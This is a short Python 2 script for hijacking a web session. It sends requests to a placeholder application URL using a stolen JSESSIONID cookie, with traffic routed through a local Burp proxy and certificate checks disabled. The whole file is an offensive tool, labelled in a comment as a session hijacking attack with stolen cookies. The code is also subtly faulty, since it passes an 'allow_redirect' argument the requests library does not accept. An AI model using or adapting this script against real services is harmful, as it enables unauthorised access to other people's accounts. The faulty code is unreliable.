import requests
from bs4 import BeautifulSoup

# For deprecating the warnings
requests.packages.urllib3.disable_warnings()

# Initializing Session object
s = requests.Session()

# Can comment below if you don't want to intercept the request within the burp proxy
s.proxies = {'http':'127.0.0.1:8080', 'https':'127.0.0.1:8080'}

user_agent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0"
cookies = "JSESSIONID=A63D8255DA81"

''' To perform the session hijacking attack attempt, 
update the request headers with stolen cookies...
'''
s.headers.update({'User-Agent':user_agent, 'Cookie':cookies})

r = s.get("https://abc.com:8888/app/application1.html", verify=False, allow_redirect=True)

print "\n---------------------------------------"
print "\nRequest Headers that were sent to server: \n", r.request.headers
print "\n---------------------------------------"
print "\n Response Body: \n", r.text
print "\n---------------------------------------"
print "Response Headers after resource request: \n", r.headers
print "\nResponse Status Code: ",r.status_code, "\n"
